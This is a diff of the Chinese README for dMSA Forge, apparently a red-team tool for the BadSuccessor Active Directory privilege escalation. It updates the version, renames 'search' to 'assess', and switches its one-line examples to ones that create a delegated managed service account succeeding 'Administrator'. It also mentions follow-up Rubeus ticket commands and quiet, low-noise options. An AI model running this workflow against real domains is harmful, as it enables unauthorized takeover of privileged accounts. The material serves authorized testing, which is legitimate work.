@@ -1,14 +1,14 @@
 # dMSA Forge
 
-[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.8)
+[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.9)
 [![Tests](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml/badge.svg)](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml)
 [![License](https://img.shields.io/badge/license-Impacket%20Apache--1.1-blue)](https://github.com/RedteamNotes/dmsa-forge/blob/main/LICENSE)
 
 **语言：** [English](../README.md) | 简体中文 | [Français](README.fr.md)
 
-当前版本：`v0.5.8`
+当前版本：`v0.5.9`
 
-面向授权 [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) LDAP 工作流的 [dMSA](https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) forge：add、verify、delete、search。
+面向授权 [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) LDAP 工作流的 [dMSA](https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) forge：assess、add、verify、delete。
 
 围绕 LDAP 389 签名连接、原子化 dMSA 创建、创建后验证、简洁操作帮助、项目 profile 和结构化报告设计。
 
@@ -69,7 +69,6 @@ dmsa-forge update
 
 ```bash
 dmsa-forge add -h
-dmsa-forge add --help-advanced
 dmsa-forge update --dry-run
 ```
 
@@ -81,48 +80,56 @@ dmsa-forge update --dry-run
 使用 safe profile 预览 add。README 中的命令刻意采用一行可复制形式；如果需要使用 `proxychains -f chain1080.conf -q` 这类本地 wrapper，把它放在 `dmsa-forge` 前面即可。
 
 ```bash
-dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --profile safe --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'ACCOUNT_TO_SUCCEED' --principals-allowed '<SID_OR_NAME>'
+dmsa-forge plan add redteamnotes.com/operator:'PASSWORD' --profile safe --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
 默认情况下，`DOMAIN/user` 会推断 `--scope-domain`、`--scope-base-dn` 和 `--base-dn`；连接默认使用 LDAP/389；设置 `--dmsa-name` 后，`--dns-hostname` 会按账号域名推断。对 `add` 来说，必须显式选择 `--target-account` 指向要接替的账号，并用 `--principals-allowed` 指定可读取托管密码的主体。
+
+模板使用 `redpen` 作为建议 dMSA 名，使用 `Administrator` 作为常见 predecessor account 示例。授权链路指向其它对象时，请替换对应值。
 
 ## 操作流程
 
 这些模板保持一行形式，便于复制粘贴、回看 shell history 和整理演练记录。使用前请替换占位符。
 
+评估 OU 权限：
+
+```bash
+dmsa-forge assess redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com
+```
+
 添加前验证：
 
 ```bash
-dmsa-forge verify eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen
+dmsa-forge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen
 ```
 
 计划添加：
 
 ```bash
-dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'ACCOUNT_TO_SUCCEED' --principals-allowed '<SID_OR_NAME>'
+dmsa-forge plan add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
 添加：
 
 ```bash
-dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'ACCOUNT_TO_SUCCEED' --principals-allowed '<SID_OR_NAME>'
+dmsa-forge add redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --target-account 'Administrator' --principals-allowed '<SID_OR_NAME>'
 ```
 
 添加后验证：
 
 ```bash
-dmsa-forge verify eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen
+dmsa-forge verify redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen
 ```
 
 用完后删除：
 
 ```bash
-dmsa-forge delete eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --yes
+dmsa-forge delete redteamnotes.com/operator:'PASSWORD' --dc-host dc.redteamnotes.com --target-ou 'OU=Dev,DC=redteamnotes,DC=com' --dmsa-name redpen --yes
 ```
 
 `add` 或 `verify` 验证成功后，`Next steps` 会直接给出具体的外部 Kerberos 命令。生成流程会先执行 `Rubeus hash`，再把输出中的 AES256 值用于 `asktgt`，最后执行 dMSA `asktgs` 请求。
 
-目标账号解析基于 LDAP 搜索。`--target-account` 会写入 `msDS-ManagedAccountPrecededByLink`；`--principals-allowed` 会决定写入 `msDS-GroupMSAMembership` 的 SID。search 生成的后续命令可以带上发现的 principal SID，但目标账号仍然必须由操作者明确选择。
+目标账号解析基于 LDAP 搜索。`--target-account` 会写入 `msDS-ManagedAccountPrecededByLink`；`--principals-allowed` 会决定写入 `msDS-GroupMSAMembership` 的 SID。assess 生成的后续命令可以带上发现的 principal SID，但目标账号仍然必须由操作者明确选择。
 
 安全控制：
 
@@ -132,7 +139,7 @@ dmsa-forge delete eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb
 - 未指定 `--method` 和 `--port` 时，先尝试 LDAP/389。如果连接失败，dMSA Forge 可以继续尝试 LDAPS/636，并把候选尝试写入终端输出和 JSON/文本报告。单独传 `--port 636` 会推断为 LDAPS；同时指定 `--method` 和 `--port` 时才要求完全匹配。
 - 设置 `--dmsa-name` 后，`--dns-hostname` 默认推断为 `<dmsa-name>.<account-domain>`。
 - 使用 `--dc-host` 指定 DC 主机名；只有 DNS 或路由需要 IP 覆盖时才传 `--dc-ip`。自动 DC IP 解析不会做网络探测；multicast、loopback、link-local、unspecified、broadcast 和 reserved 结果会被拒绝，避免 proxy DNS 占位地址（例如 `224.0.0.1`）进入 Kerberos `/dc:` 参数。
-- 对 `search` 来说，`--target-ou` 用于缩小 OU 搜索基准。DC 前置检查是 best-effort；失败时会继续 OU 搜索并记录 warning。
+- 对 `assess` 来说，`--target-ou` 用于缩小 OU 评估基准。DC 前置检查是 best-effort；失败时会继续 OU 评估并记录 warning。
 - 目标账号名和 `--principals-allowed` 名称解析会优先选择精确的 `sAMAccountName`、UPN 或 CN 匹配。LDAP 结果有歧义时默认失败，并提示传完整 DN 或 SID。
 - `delete` 必须显式传入 `--yes`。旧的 `modify` 工作流已移除；请使用 `delete`、`add` 和 `verify`。
 - 本地输出默认脱敏。`--no-redact` 必须同时使用 `--debug`。
@@ -140,18 +147,20 @@ dmsa-forge delete eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb
 - 使用 `--output-only` 进行超静默执行。该选项会自动开启 `--quiet`、`--no-banner`，未带 `--output` 时默认输出 JSON；带 `--output` 时文件仍以 JSON 形式写入。
 - 使用 `--quiet` 将终端输出压缩为警告/错误级别。
 - 嵌入本地脚本时可用 `--no-banner` 压缩本地输出。
-- 使用 `--lean` 开启更轻量的本地输出和搜索默认值（等价于 `--minimal`、`--quiet`、`--skip-dc-prereq`、`--no-banner`）。`--low-noise` 继续作为兼容别名保留。
+- 使用 `--lean` 开启更轻量的本地输出和评估默认值（等价于 `--minimal`、`--quiet`、`--skip-dc-prereq`、`--no-banner`）。
 
 结构化 JSON 报告包含 `schema_version`，便于自动化脚本固定解析行为。
 
-搜索模式：
+人类终端输出按 `Run context`、`Progress`、`Findings` 和 `Next steps` 分块。Warning 和 error 仍保留 `[!]` / `[-]` 严重级别标记，并且只在终端支持时使用颜色；JSON、quiet 和 output-only 模式保持适合机器解析的干净输出。
 
-- `search` 默认执行 OU 安全描述符分析。
-- 搜索结果列出具备 BadSuccessor 相关 OU 权限的主体，也就是能创建 dMSA 对象或控制对应 OU 的主体。工具会把这些 SID 与当前绑定账号的 `objectSid` 和 `tokenGroups` 比对，并标记每行是否适用于当前绑定账号；如果 `tokenGroups` 不可用，组授权命中会显示为 `unknown`。
-- 使用 `--summary` 才会进入轻量 OU-only 列表模式。`--include-security-descriptor` 和 `--include-sd` 继续作为默认分析模式的显式兼容别名保留。
+评估模式：
+
+- `assess` 默认执行 OU 安全描述符分析。
+- 评估结果列出具备 BadSuccessor 相关 OU 权限的主体，也就是能创建 dMSA 对象或控制对应 OU 的主体。工具会把这些 SID 与当前绑定账号的 `objectSid` 和 `tokenGroups` 比对，并标记每行是否适用于当前绑定账号；如果 `tokenGroups` 不可用，组授权命中会显示为 `unknown`。
+- 使用 `--summary` 才会进入轻量 OU-only 列表模式。`--include-security-descriptor` 可显式选择默认分析模式。
 - `--resolve-names` 用于把匹配 SID 解析成名称。
-- 使用 `--minimal` 避免广泛 search 分析、名称解析和额外 Kerberos 命令输出。
-- `--skip-dc-prereq` 可跳过 `search` 中的 DC 操作系统前置检查，降低 LDAP 查询噪声。
+- 使用 `--minimal` 避免广泛评估分析、名称解析和额外 Kerberos 命令输出。
+- `--skip-dc-prereq` 可跳过 `assess` 中的 DC 操作系统前置检查，降低 LDAP 查询噪声。
 
 高级和兼容性细节见 [advanced.zh-CN.md](advanced.zh-CN.md)。
 
